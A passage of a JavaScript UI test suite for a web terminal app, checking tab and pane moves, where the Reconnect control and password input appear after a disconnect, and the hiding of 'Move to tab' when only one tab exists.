  await until(() => tabEls(win).length === 2, 500);
  await sleep(20);
  ok(openMenus(env).length === 0, 'C closed while its menu was open: no menu left on screen; got ' + openMenus(env).length);
  keyAt(win, 'Escape', 'Escape');
  cleanup(env);
});

test('pane menu: "Move to tab" in a pane bar, and in the top bar for a lone pane, moves the pane into the chosen tab', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a1 = await tConnect(win, 'a1.host');
  const b1 = a1 && await tNewTab(win, 'b1.host');
  const b2 = b1 && await tSplit(win, b1, 'h', 'b2.host');
  if (!needTabs(win) || !b2) { ok(false, 'setup'); cleanup(env); return; }
  const tA = tabOfPane(a1), tB = tabOfPane(b1);
  const nameA = tabLabel(tabById(win, tA)), nameB = tabLabel(tabById(win, tB));
  const mark = env.log.length;
  const spy = sessionSpy(win, [a1, b1, b2]);
  const btn = barOf(b2) && barOf(b2).querySelector('[data-act="move-to"]');
  ok(!!btn && !env.lay.hidden(btn) && !btn.disabled, 'b2\'s bar has a visible "Move to tab" button [data-act="move-to"]');
  if (btn) press(win, btn);
  await until(() => targetItems(env).length >= 1, 300);
  const names = targetItems(env).map(itemText);
  ok(names.some(n => n.indexOf(nameA) >= 0) && !names.some(n => n.indexOf(nameB) >= 0),
     'its menu lists A ' + show(nameA) + ' and not B; got ' + show(names));
  const err = btn ? await chooseTarget(env, null, nameA) : 'no button';
  ok(!err, 'chose A: ' + (err || 'ok'));
  await until(() => panesOfTab(win, tA).length === 2, 500);
  ok(shape(win, tA) === '(h a1.host b2.host)' && shape(win, tB) === 'b1.host', 'b2 right of a1 in A; b1 alone in B; got ' + show(shapesNow(win)));
  ok(tabId(activeTab(win)) === tA && win.activeId === b2.id, 'A shown, b2 active');
  ok(openMenus(env).length === 0, 'the menu closed');
  // The lone pane b1: its action is in the top bar.
  clickTab(win, tabById(win, tB));
  await until(() => tabId(activeTab(win)) === tB, 500);
  await sleep(30);
  const tb = toolBtn(win, 'move-to');
  ok(!!tb && toolsShown(env) && !env.lay.hidden(tb) && !tb.disabled, 'a lone pane has "Move to tab" in the top bar (#paneTools [data-act="move-to"])');
  if (tb) press(win, tb);
  const err2 = tb ? await chooseTarget(env, null, tabLabel(tabById(win, tA))) : 'no button';
  ok(!err2, 'chose A: ' + (err2 || 'ok'));
  await until(() => tabEls(win).length === 1, 500);
  ok(tabEls(win).length === 1 && panesOfTab(win, tA).length === 3 && !tabRootById(win, tB), 'B emptied and gone; all three panes in A; got ' + show(shapesNow(win)));
  ok(tabId(activeTab(win)) === tA && win.activeId === b1.id, 'A shown, b1 active');
  ok(spy.length === 0 && sessionCalls(env, mark).length === 0, 'no reconnect, no restart; got ' + show(spy.concat(sessionCalls(env, mark))));
  ok(show(savedShapes(win).tabs) === show(shapesNow(win)), 'saved at once');
  cleanup(env);
});

// =====================================================================
// Reconnect in the pane's bar row (owner, 2026-10-05): "the Reconnect
// button is almost right, in the middle, but it is on the terminal; it
// must be in the row where 'persistent' is written, in the middle".
// Written from the decided behaviour, before the change.
//
// DOM contract these tests rely on:
//   [data-reconnect=ID]      pane ID's Reconnect control, as today: a
//                            <span> message, input.reconnect-pw
//                            [data-reconnect-pw=ID] (Enter reconnects),
//                            a "Reconnect" button; .sev-err / .sev-warn /
//                            .bare on it as today; hidden while connected
//   split pane (2+ in tab)   the control is inside that pane's own
//                            .pane-bar (not over the terminal)
//   lone pane                the control is inside a strip at the top of
//                            the pane: an element .reconnect-strip, or the
//                            pane's .pane-bar itself shown as an overlay;
//                            out of flow (position absolute/fixed on it or
//                            an ancestor inside the pane), so the terminal
//                            keeps its size; hidden once connected
// Centring and overlap are geometry: tests/e2e/scenarios/reconnectbar.mjs.
// =====================================================================
const rcCtl = (win, p) => win.document.querySelector('[data-reconnect="' + p.id + '"]');
const rcPw = (win, p) => win.document.querySelector('[data-reconnect-pw="' + p.id + '"]');
const rcStrip = (win, p) => { const c = rcCtl(win, p); return c && (c.closest('.reconnect-strip') || c.closest('.pane-bar')); };
const rcShown = (env, el) => !!el && !env.lay.hidden(el);
// Every visible "Reconnect" button on the page that acts on pane p.
const rcButtons = (env, p) => Array.from(env.win.document.querySelectorAll('button'))
  .filter(b => b.textContent.trim() === 'Reconnect' && !env.lay.hidden(b) &&
               (p.el.contains(b) || (b.getAttribute('onclick') || '').indexOf("'" + p.id + "'") >= 0 ||
                (b.closest('[data-reconnect]') && b.closest('[data-reconnect]').getAttribute('data-reconnect') === p.id)));
// A disconnect the way the transport ends one (transportFatal).
function rcDrop(win, p, reason, noCreds) {
  if (noCreds) { p.password = ''; p.key = ''; }
  win.eval(`(() => { const p = panes['${p.id}']; endSession(p, {save: true}); showReconnectBar(p${reason ? ", '" + reason + "'" : ''}); updatePaneBadge(p); })()`);
}
function rcWhere(win, p) {
  const c = rcCtl(win, p);
  if (!c) return 'no control';
  const parts = [];
  for (let e = c.parentElement; e && e !== p.el.parentElement; e = e.parentElement)
    parts.push(e.tagName.toLowerCase() + (e.className && typeof e.className === 'string' ? '.' + e.className.trim().split(/\s+/).join('.') : ''));
  return parts.join(' < ');
}

test('reconnect in the bar: a split pane\'s Reconnect sits in its own pane bar, the bar stays whole', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host', {persistent: true});
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const b = await tSplit(win, a, 'h', 'b.host');
  ok(!!b && tabOfPane(b) === tabOfPane(a), 'two panes in one tab');
  if (!b) { cleanup(env); return; }
  await settled(win, a); await settled(win, b);
  const mark = env.log.length;
  const sizeA = a.term.cols + 'x' + a.term.rows, nA = a.term._resizes.length;
  rcDrop(win, a);
  await sleep(250);
  const c = rcCtl(win, a), bar = barOf(a);
  ok(rcShown(env, c), 'the Reconnect control is shown');
  ok(!!c && c.closest('.pane-bar') === bar, 'it is inside the pane\'s own .pane-bar; it is in: ' + rcWhere(win, a));
  ok(!!c && !c.closest('.pane-term') && !c.closest('.pane-overlays'), 'not over the terminal (.pane-term / .pane-overlays)');
  ok(barShown(env, a), 'the bar is shown');
  const keep = [['badge', '[data-pane-badge]'], ['label', '[data-pane-label]'], ['persistent tag', '.pane-tag.persistent'],
                ['split', '[title="Split horizontal"]'], ['close', '[title="Close pane"]'], ['move to new tab', '[data-act="to-tab"]']];
  // (Not "Move to tab": with this one tab it is not shown at all - see hide:.)
  const gone = keep.filter(([, sel]) => !rcShown(env, bar && bar.querySelector(sel))).map(([n]) => n);
  ok(gone.length === 0, 'badge, label, persistent tag and the buttons stay in the bar; missing: ' + JSON.stringify(gone));
  ok(rcButtons(env, a).length === 1, 'exactly one Reconnect button for the pane; got ' + rcButtons(env, a).length);
  ok(!rcShown(env, rcCtl(win, b)) && rcButtons(env, b).length === 0, 'the connected neighbour shows none');
  ok(a.term.cols + 'x' + a.term.rows === sizeA && a.term._resizes.length === nA && resizesFor(env, 'sid-a.host', mark).length === 0,
     'the terminal keeps its size, no /api/resize; ' + sizeA + ' -> ' + a.term.cols + 'x' + a.term.rows);
  // With a message and the password input: also in the bar.
  rcDrop(win, a, 'auth_failed', true);
  await sleep(30);
  const pw = rcPw(win, a);
  ok(rcShown(env, pw) && pw.closest('.pane-bar') === bar, 'the password input is in the bar too; in: ' + (pw ? (pw.closest('.pane-bar') ? 'bar' : 'elsewhere') : 'missing'));
  const msg = c && c.querySelector('span');
  ok(rcShown(env, msg) && msg.closest('.pane-bar') === bar && /Authentication failed — type password/.test(msg.textContent),
     'the message is in the bar; got ' + JSON.stringify(msg && msg.textContent));
  ok(c.classList.contains('sev-err'), 'auth failure is still red (.sev-err)');
  ok(win.document.activeElement === pw, 'the password input has focus');
  // Enter with a typed password reconnects with it; the control goes.
  pw.value = 'typed-a';
  const kd = new win.KeyboardEvent('keydown', {key: 'Enter', bubbles: true, cancelable: true});
  const code = pw.getAttribute('onkeydown');
  if (code) win.eval('(function(event){' + code + '})').call(pw, kd); else pw.dispatchEvent(kd);
  await until(() => !!a.sid, 1500);
  const cn = env.log.slice(mark).filter(e => e.action === 'connect' && e.body && e.body.host === 'a.host');
  ok(cn.length === 1 && cn[0].body.password === 'typed-a', 'Enter reconnects with the typed password; got ' + JSON.stringify(cn.map(e => e.body.password)));
  ok(!rcShown(env, rcCtl(win, a)) && rcButtons(env, a).length === 0, 'the control is hidden once reconnected');
  ok(barShown(env, a) && rcShown(env, bar.querySelector('[data-pane-label]')), 'the bar is back to its usual contents');
  cleanup(env);
});

test('reconnect strip: a lone pane gets a strip at its top with Reconnect; the terminal keeps its size', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  await settled(win, a);
  ok(!barShown(env, a), 'lone pane: no pane bar');
  const mark = env.log.length;
  const size0 = a.term.cols + 'x' + a.term.rows, n0 = a.term._resizes.length;
  rcDrop(win, a);
  await sleep(250);
  const c = rcCtl(win, a), strip = rcStrip(win, a);
  ok(rcShown(env, c), 'the Reconnect control is shown');
  ok(!!strip && a.el.contains(strip) && rcShown(env, strip),
     'it sits in a strip of the pane (.reconnect-strip or the pane bar as an overlay); it is in: ' + rcWhere(win, a));
  ok(!!strip && env.lay.outOfFlow(strip, a.el), 'the strip is drawn over the terminal (position absolute/fixed), not in the pane column');
  ok(!(c && c.classList.contains('reconnect-strip')) || !!(strip && strip !== c), 'the strip is a strip, not the card renamed');
  ok(rcButtons(env, a).length === 1, 'exactly one Reconnect button for the pane (none in the top bar); got ' + rcButtons(env, a).length);
  ok(a.term.cols + 'x' + a.term.rows === size0 && a.term._resizes.length === n0,
     'the terminal keeps its size when the strip appears: ' + size0 + ' -> ' + a.term.cols + 'x' + a.term.rows);
  ok(resizesFor(env, 'sid-a.host', mark).length === 0, 'no /api/resize');
  ok(toolsShown(env), 'the pane actions (with the persistent/short-lived tag) stay in the top bar');
  // Message and password input ride in the strip.
  rcDrop(win, a, 'auth_failed', true);
  await sleep(30);
  const pw = rcPw(win, a);
  ok(rcShown(env, pw) && !!strip && strip.contains(pw), 'the password input is in the strip');
  ok(win.document.activeElement === pw, 'and has focus');
  const msg = c && c.querySelector('span');
  ok(!!msg && !!strip && strip.contains(msg) && /Authentication failed — type password/.test(msg.textContent) && c.classList.contains('sev-err'),
     'the auth message is in the strip, red; got ' + JSON.stringify(msg && msg.textContent));
  rcDrop(win, a, 'no_vault_key');
  ok(/Vault key missing/.test(msg.textContent) && c.classList.contains('sev-warn') && !rcShown(env, rcPw(win, a)),
     'vault: warning, no password input');
  // Reconnect by the button: the strip goes, the size never moved.
  a.password = 'pw-a.host';
  rcDrop(win, a);
  await sleep(30);
  win.eval(`reconnectPane('${a.id}')`);
  await until(() => !!a.sid, 1500);
  await sleep(250);
  ok(!!a.sid, 'reconnected');
  ok(!rcShown(env, rcCtl(win, a)) && !rcShown(env, rcStrip(win, a)) && rcButtons(env, a).length === 0,
     'strip and control are gone once connected');
  ok(!barShown(env, a), 'and the lone pane still has no pane bar');
  ok(a.term.cols + 'x' + a.term.rows === size0 && a.term._resizes.length === n0,
     'the terminal never changed size: ' + size0 + ' -> ' + a.term.cols + 'x' + a.term.rows + ', refits ' + (a.term._resizes.length - n0));
  const odd = sizesSent(env, 'sid-a.host', mark).filter(s => s !== size0);
  ok(odd.length === 0, 'no other size sent to the server; got ' + JSON.stringify(odd));
  cleanup(env);
});

test('reconnect strip <-> bar: a disconnected pane going lone / split / to a new tab keeps one control, the typed password and focus', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  const tA = tabOfPane(a);
  const b = await tNewTab(win, 'b.host');
  ok(!!b && tabOfPane(b) !== tA, 'b in a second tab');
  if (!b) { cleanup(env); return; }
  win.showTab(tA);
  await until(() => tabId(activeTab(win)) === tA, 500);
  rcDrop(win, a, 'auth_failed', true);
  await sleep(30);
  const pw = rcPw(win, a);
  ok(rcShown(env, pw), 'lone: password input shown');
  pw.value = 'half-typed';
  pw.focus();
  // 'bar': in the pane's own bar, shown in the pane column (split);
  // 'strip': in a shown strip drawn over the terminal (lone).
  const whereNow = () => {
    const c = rcCtl(win, a), s = rcStrip(win, a), bar = barOf(a);
    if (!rcShown(env, c)) return 'hidden';
    if (s && s === bar && barShown(env, a) && !env.lay.outOfFlow(bar, a.el)) return 'bar';
    if (s && rcShown(env, s) && env.lay.outOfFlow(s, a.el)) return 'strip';
    return rcWhere(win, a);
  };
  const state = (label, wantIn) => {
    const p = rcPw(win, a);
    ok(whereNow() === wantIn, label + ': the control is in the ' + wantIn + '; it is in: ' + whereNow());
    ok(rcButtons(env, a).length === 1, label + ': one Reconnect button; got ' + rcButtons(env, a).length);
    ok(!!p && p.value === 'half-typed' && rcShown(env, p), label + ': the typed password is kept; got ' + JSON.stringify(p && p.value));
  };
  state('lone', 'strip');
  // b joins a's tab: a is split now (b, the moved pane, takes focus).
  win.movePaneToTab(b.id, tA);
  await sleep(60);
  ok(panesOfTab(win, tA).length === 2, 'b moved into a\'s tab');
  state('split (b moved in)', 'bar');
  // b closes: a is lone again; the input keeps focus.
  rcPw(win, a).focus();
  ok(win.document.activeElement === rcPw(win, a), '(the password input took focus before the close)');
  win.closePane(b.id);
  await until(() => !win.panes[b.id], 500);
  await sleep(60);
  state('lone again (neighbour closed)', 'strip');
  ok(win.document.activeElement === rcPw(win, a), 'the password input still has focus; active: ' +
     (win.document.activeElement && (win.document.activeElement.className || win.document.activeElement.tagName)));
  // Split again, then a goes to a tab of its own.
  const c2 = await tSplit(win, a, 'v', 'c.host');
  ok(!!c2 && tabOfPane(c2) === tA, 'c split into a\'s tab');
  if (!c2) { cleanup(env); return; }
  await sleep(60);
  state('split (new pane)', 'bar');
  rcPw(win, a).focus();
  win.movePaneToNewTab(a.id);
  await sleep(60);
  ok(tabOfPane(a) !== tA, 'a is in a new tab');
  state('lone in a new tab', 'strip');
  ok(win.document.activeElement === rcPw(win, a), 'the moved pane\'s password input has focus, not its dead terminal; active: ' +
     (win.document.activeElement && (win.document.activeElement.className || win.document.activeElement.tagName)));
  // Hidden tab: nothing of it shows.
  const tNew = tabOfPane(a);
  win.showTab(tA);
  await until(() => tabId(activeTab(win)) === tA, 500);
  ok(!rcShown(env, rcCtl(win, a)) && !rcShown(env, rcStrip(win, a)) && rcButtons(env, a).length === 0,
     'a in a hidden tab: its Reconnect is not shown');
  ok(visibleAll(env, '[data-reconnect], .reconnect-strip').length === 0,
     'no Reconnect anywhere on screen; got ' + visibleAll(env, '[data-reconnect], .reconnect-strip').length);
  win.showTab(tNew);
  await until(() => tabId(activeTab(win)) === tNew, 500);
  state('shown again', 'strip');
  // And the kept password is what reconnects.
  const mark = env.log.length;
  win.eval(`reconnectPane('${a.id}')`);
  await until(() => !!a.sid, 1500);
  const cn = env.log.slice(mark).filter(e => e.action === 'connect' && e.body && e.body.host === 'a.host');
  ok(cn.length === 1 && cn[0].body.password === 'half-typed', 'reconnects with the password typed before the moves; got ' + JSON.stringify(cn.map(e => e.body.password)));
  ok(!rcShown(env, rcCtl(win, a)) && !rcShown(env, rcStrip(win, a)), 'and the control is gone');
  cleanup(env);
});

test('reconnect strip: a lone pane\'s transfer progress still shows next to the strip', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S2); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !a) { cleanup(env); return; }
  await settled(win, a);
  const st = hangingXhr(win);
  const inp = a.el.querySelector('[data-upload-input]');
  Object.defineProperty(inp, 'files', {value: [{name: 'f.txt', size: 4}], configurable: true});
  fireChange(win, inp);
  await until(() => st.xhrs.length > 0, 1000);
  const prog = () => visibleAll(env, '.upload-progress').filter(e => a.el.contains(e));
  ok(prog().length === 1, 'the upload progress is shown for the lone pane; got ' + prog().length);
  rcDrop(win, a);
  await sleep(60);
  const strip = rcStrip(win, a);
  ok(rcShown(env, rcCtl(win, a)) && rcShown(env, strip), 'the Reconnect strip is shown');
  ok(prog().length === 1 || !a.upload, 'a running transfer keeps its progress visible (or the transfer was ended); progress shown: ' + prog().length + ', upload: ' + !!a.upload);
  ok(!(strip && prog().some(e => strip.contains(e) || e.contains(strip))), 'progress and strip are separate (neither inside the other)');
  ok(rcButtons(env, a).length === 1, 'one Reconnect button');
  if (a.upload) win.cancelTransfer(a.id);
  cleanup(env);
});

// =====================================================================
// A control whose action is impossible in the current layout is not
// shown (owner, 2026-10-06: "the Move to tab button should be removed
// when there are no other tabs"). Rule (coordinator): structurally
// impossible -> HIDDEN, not disabled, and back as soon as it becomes
// possible; transiently unavailable (upload/download while disconnected
// or during a transfer) -> stays visible and disabled.
// Written from the request, before the change.
//
// Structural cases found by the audit:
//   [data-act="move-to"] in #paneTools (a lone pane) and in every pane
//     bar (2+ panes in a tab): "Move to tab" with no other tab.
//   The tab menu's "Move into tab": with no other tab.
// Hidden means: .h / [hidden] / display:none on it or an ancestor (the
// layout model's cascade), so a CSS rule keyed on a body/strip class is
// as good as a class on the button.
// =====================================================================
const moveShown = env => visibleAll(env, '[data-act="move-to"]');
const intoItem = env => findItem(env, /^Move into tab/i);
function noMoveAnywhere(env, what) {
  const v = moveShown(env);
  ok(v.length === 0, what + ': no "Move to tab" button shown anywhere; shown: ' +
     show(v.map(b => b.closest('#paneTools') ? '#paneTools' : 'bar of ' + (b.closest('.pane') || {getAttribute: () => '?'}).getAttribute('data-pane'))));
}
function tabMenuHasInto(env, tEl) {
  tabMenu(env.win, tEl);
  const it = intoItem(env);
  const items = itemsShown(env).map(itemText);
  const r = {into: !!it, disabled: !!it && it.getAttribute('aria-disabled') === 'true', items};
  closeMenusNow(env);
  return r;
}
function closeMenusNow(env) {
  keyAt(env.win, 'Escape', 'Escape');
  if (openMenus(env).length) env.win.closeMenus(false);
}

test('hide: with one tab "Move to tab" is not shown - not in the top bar of a lone pane, not in a pane bar, not in the tab menu', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !needTools(win) || !a) { ok(false, 'setup'); cleanup(env); return; }
  await sleep(30);
  ok(toolsShown(env), 'a lone pane: #paneTools shown');
  const mt = toolBtn(win, 'move-to');
  ok(!!mt, '#paneTools still has the [data-act="move-to"] button in the DOM (to come back)');
  ok(!!mt && env.lay.hidden(mt), 'one tab: #paneTools "Move to tab" is hidden; it is ' +
     (mt ? (mt.disabled ? 'shown, disabled' : 'shown and enabled') : 'missing'));
  ACTS.forEach(act => ok(!env.lay.hidden(toolBtn(win, act)), 'the other pane actions stay: [data-act=' + act + '] shown'));
  noMoveAnywhere(env, 'one tab, one pane');
  const m1 = tabMenuHasInto(env, activeTab(win));
  ok(!m1.into, 'one tab: the tab menu has no "Move into tab" item (not even a disabled one); items: ' + show(m1.items));
  ok(m1.items.some(x => /^Rename/i.test(x)) && m1.items.some(x => /^Close/i.test(x)), 'Rename and Close are still in the menu; items: ' + show(m1.items));
  // A split: two panes, still one tab.
  const b = await tSplit(win, a, 'h', 'b.host');
  if (!b) { ok(false, 'split'); cleanup(env); return; }
  await sleep(30);
  ok(barShown(env, a) && barShown(env, b), 'two panes: both bars shown');
  [a, b].forEach(p => {
    const bar = barOf(p);
    const mv = bar && bar.querySelector('[data-act="move-to"]');
    ok(!!mv && env.lay.hidden(mv), p.host + ': the bar\'s "Move to tab" is hidden with one tab; it is ' +
       (mv ? (env.lay.hidden(mv) ? 'hidden' : (mv.disabled ? 'shown, disabled' : 'shown and enabled')) : 'missing'));
    const keep = [['Move to new tab', '[data-act="to-tab"]'], ['split', '[title="Split horizontal"]'],
                  ['split v', '[title="Split vertical"]'], ['close', '[title="Close pane"]'],
                  ['upload', '[data-upload-btn]'], ['download', '[data-download-btn]']];
    const gone = keep.filter(([, s]) => env.lay.hidden(bar.querySelector(s))).map(([n]) => n);
    ok(gone.length === 0, p.host + ': the other bar buttons stay shown (Move to new tab is possible: the tab has 2 panes); hidden: ' + show(gone));
  });
  noMoveAnywhere(env, 'one tab, two panes');
  const m2 = tabMenuHasInto(env, activeTab(win));
  ok(!m2.into, 'one tab with a split: no "Move into tab" in its menu; items: ' + show(m2.items));
  // Transient stays disabled, not hidden: a dropped pane's upload/download.
  win.closePane(b.id);
  await until(() => paneList(win).length === 1, 500);
  await sleep(30);
  rcDrop(win, a);
  await sleep(50);
  const up = toolBtn(win, 'upload'), dn = toolBtn(win, 'download');
  ok(toolsShown(env) && !env.lay.hidden(up) && up.disabled && !env.lay.hidden(dn) && dn.disabled,
     'disconnected (transient): upload/download stay shown and disabled; upload ' +
     (env.lay.hidden(up) ? 'hidden' : (up.disabled ? 'disabled' : 'enabled')) + ', download ' + (env.lay.hidden(dn) ? 'hidden' : (dn.disabled ? 'disabled' : 'enabled')));
  noMoveAnywhere(env, 'one tab, disconnected');
  cleanup(env);
});

test('hide: a second tab brings "Move to tab" back at once; closing it again hides it at once (x, middle click, Alt+W)', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  if (!needTabs(win) || !needTools(win) || !a) { ok(false, 'setup'); cleanup(env); return; }
  const b = await tNewTab(win, 'b.host');
  if (!b) { ok(false, 'second tab'); cleanup(env); return; }
  await sleep(30);
  const tA = tabElOfPane(win, a), tB = tabElOfPane(win, b);
  const mt = () => toolBtn(win, 'move-to');
  ok(activeTab(win) === tB && !env.lay.hidden(mt()) && !mt().disabled, 'two tabs, B (lone) in front: #paneTools "Move to tab" shown and enabled');
  const mB = tabMenuHasInto(env, tB);
  ok(mB.into && !mB.disabled, 'two tabs: B\'s menu has an enabled "Move into tab"; items: ' + show(mB.items));
  clickTab(win, tA);
  await until(() => activeTab(win) === tA, 500);
  await sleep(20);
  ok(!env.lay.hidden(mt()), 'A (lone) in front: "Move to tab" shown');
  // B closes in the background: A in front never changes pane or tab.
  closeTabX(win, tB);
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(tabEls(win).length === 1 && activeTab(win) === tA, 'B closed by its x; A still in front');
  ok(env.lay.hidden(mt()), 'the other tab closed in the background: A\'s "Move to tab" is hidden at once; it is shown' +
     (mt().disabled ? ' (disabled)' : ' and enabled'));
  const mA = tabMenuHasInto(env, tA);
  ok(!mA.into, 'and A\'s menu lost "Move into tab"; items: ' + show(mA.items));
  // A split tab in front, another tab closed by a middle click.
  const a2 = await tSplit(win, a, 'h', 'a2.host');
  const c = a2 && await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'split + third tab'); cleanup(env); return; }
  clickTab(win, tA);
  await until(() => activeTab(win) === tA, 500);
  await sleep(20);
  const barMv = p => barOf(p) && barOf(p).querySelector('[data-act="move-to"]');
  ok([a, a2].every(p => !env.lay.hidden(barMv(p))), 'two tabs: both bars of A show "Move to tab"');
  middleClick(win, tabElOfPane(win, c));
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(tabEls(win).length === 1, 'C closed by a middle click');
  ok([a, a2].every(p => env.lay.hidden(barMv(p))), 'one tab left: the bars\' "Move to tab" are hidden at once; shown on: ' +
     show([a, a2].filter(p => !env.lay.hidden(barMv(p))).map(p => p.host)));
  // The split tab hidden behind a lone tab; the lone tab closed by Alt+W.
  const d = await tNewTab(win, 'd.host');
  if (!d) { ok(false, 'tab D'); cleanup(env); return; }
  await sleep(20);
  ok(!env.lay.hidden(mt()), 'D (lone) in front, two tabs: "Move to tab" shown');
  typeIn(win, d, 'KeyW', 'w', {alt: true});
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(tabEls(win).length === 1 && activeTab(win) === tA, 'Alt+W closed D; A (split) in front');
  noMoveAnywhere(env, 'after Alt+W left one tab');
  ok(!tabMenuHasInto(env, tA).into, 'and no "Move into tab" in A\'s menu');
  cleanup(env);
});

test('hide: merging the last other tab away hides "Move to tab"; "Move to new tab" brings it back', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const b = a && await tNewTab(win, 'b.host');
  if (!needTabs(win) || !needTools(win) || !b) { ok(false, 'setup'); cleanup(env); return; }
  await sleep(30);
  const tA = tabOfPane(a);
  // B's lone pane by its top-bar "Move to tab" into A.
  const tb = toolBtn(win, 'move-to');
  ok(!!tb && !env.lay.hidden(tb), 'two tabs: "Move to tab" shown in the top bar');
  if (tb) press(win, tb);
  const err = await chooseTarget(env, null, tabLabel(tabById(win, tA)));
  ok(!err, 'moved b into A: ' + (err || 'ok'));
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(tabEls(win).length === 1 && panesOfTab(win, tA).length === 2, 'one tab, two panes');
  noMoveAnywhere(env, 'after the last other tab was emptied by a move');
  // "Move to new tab" from a bar: two tabs again.
  const toTab = barOf(a) && barOf(a).querySelector('[data-act="to-tab"]');
  if (toTab) press(win, toTab);
  await until(() => tabEls(win).length === 2, 500);
  await sleep(30);
  ok(tabEls(win).length === 2, '"Move to new tab": two tabs');
  ok(!env.lay.hidden(toolBtn(win, 'move-to')), 'a pane moved to a new tab (lone, in front): "Move to tab" shown again');
  clickTab(win, tabById(win, tabOfPane(b)));
  await until(() => tabOfPane(b) === tabId(activeTab(win)), 500);
  await sleep(20);
  ok(!env.lay.hidden(toolBtn(win, 'move-to')), 'and in the other (lone) tab too');
  // The tab menu's "Move into tab": the last merge.
  const into = tabMenuHasInto(env, tabElOfPane(win, a));
  ok(into.into && !into.disabled, 'two tabs: "Move into tab" in the menu; items: ' + show(into.items));
  tabMenu(win, tabElOfPane(win, a));
  const err2 = await chooseTarget(env, /^Move into tab/i, tabLabel(tabElOfPane(win, b)));
  ok(!err2, 'merged a\'s tab into b\'s by the menu: ' + (err2 || 'ok'));
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  ok(tabEls(win).length === 1, 'one tab after the merge');
  noMoveAnywhere(env, 'after a merge by the tab menu');
  ok(!tabMenuHasInto(env, activeTab(win)).into, 'no "Move into tab" left in the menu');
  // A tab dragged onto a pane: the hook the drag ends in.
  const c = await tNewTab(win, 'c.host');
  if (!c) { ok(false, 'tab C'); cleanup(env); return; }
  await sleep(20);
  ok(visibleAll(env, '[data-act="move-to"]').length >= 1, 'C opened: "Move to tab" shown');
  win.mergeTabInto(tabOfPane(c), a.id, 'left');
  await until(() => tabEls(win).length === 1, 500);
  await sleep(30);
  noMoveAnywhere(env, 'after a tab was dragged into the other one (mergeTabInto)');
  cleanup(env);
});

test('hide: after a reload "Move to tab" follows the restored tabs - hidden with one, shown with two', async () => {
  const env1 = await mkTabEnv(TAB_PLAN(), null, S4); const w1 = env1.win;
  const a = await tConnect(w1, 'a.host');
  if (!needTabs(w1) || !a) { ok(false, 'setup'); cleanup(env1); return; }
  await sleep(50);
  const snap1 = snapshotStorage(w1);
  const a2 = await tSplit(w1, a, 'h', 'a2.host');
  await sleep(50);
  const snap2 = snapshotStorage(w1);
  const c = a2 && await tNewTab(w1, 'c.host');
  await sleep(50);
  const snap3 = snapshotStorage(w1);
  cleanup(env1);
  if (!c) { ok(false, 'setup: split and a second tab'); return; }
  // One tab, one pane.
  let env = await mkTabEnv(TAB_PLAN(), snap1, S4); let win = env.win;
  await until(() => paneList(win).filter(p => p.sid).length === 1, 2000);
  await sleep(50);
  ok(tabEls(win).length === 1 && toolsShown(env), 'reload, one tab with one pane: pane actions in the top bar');
  noMoveAnywhere(env, 'reload, one tab with one pane');
  cleanup(env);
  // One tab, two panes.
  env = await mkTabEnv(TAB_PLAN(), snap2, S4); win = env.win;
  await until(() => paneList(win).filter(p => p.sid).length === 2, 2000);
  await sleep(50);
  ok(tabEls(win).length === 1 && paneList(win).every(p => barShown(env, p)), 'reload, one tab with a split: both bars shown');
  noMoveAnywhere(env, 'reload, one tab with a split');
  cleanup(env);
  // Two tabs: shown in the lone tab's top bar and in the split tab's bars.
  env = await mkTabEnv(TAB_PLAN(), snap3, S4); win = env.win;
  await until(() => paneList(win).filter(p => p.sid).length === 3, 2000);
  await sleep(50);
  ok(tabEls(win).length === 2, 'reload, two tabs');
  const pc = paneList(win).find(p => p.host === 'c.host');
  ok(!!pc && tabOfPane(pc) === tabId(activeTab(win)), 'C (lone) in front');
  ok(!env.lay.hidden(toolBtn(win, 'move-to')), 'reload, two tabs: "Move to tab" shown in the top bar');
  const pa = paneList(win).find(p => p.host === 'a.host');
  if (pa) {
    clickTab(win, tabElOfPane(win, pa));
    await until(() => tabOfPane(pa) === tabId(activeTab(win)), 500);
    await sleep(30);
  }
  const shownBars = paneList(win).filter(p => p.host !== 'c.host')
    .filter(p => { const m = barOf(p) && barOf(p).querySelector('[data-act="move-to"]'); return m && !env.lay.hidden(m); });
  ok(shownBars.length === 2, 'reload, two tabs: both bars of the split tab show "Move to tab"; shown on ' + shownBars.length);
  cleanup(env);
});


test('hide: the only tab has no drag - no dimmed tab, no strip change, the press stays a click; with two tabs a drag still reorders', async () => {
  const env = await mkTabEnv(TAB_PLAN(), null, S4); const win = env.win;
  const a = await tConnect(win, 'a.host');
  const a2 = a && await tSplit(win, a, 'h', 'a2.host');
  if (!needTabs(win) || !a2) { ok(false, 'setup'); cleanup(env); return; }
  await sleep(30);
  const tA = activeTab(win);
  const strip0 = $(win, 'tabs').innerHTML, shape0 = show(shapesNow(win));
  const m = pointer(win);
  const [x0, y0] = centre(tA);
  let look = false;
  const mo = new win.MutationObserver(() => {
    if (win.document.querySelector('.tab.dragging') || win.document.body.classList.contains('pane-moving')) look = true;
  });
  mo.observe(win.document.body, {attributes: true, subtree: true, attributeFilter: ['class']});
  const lab = tA.querySelector('.tab-label');
  m.down(lab, x0, y0);
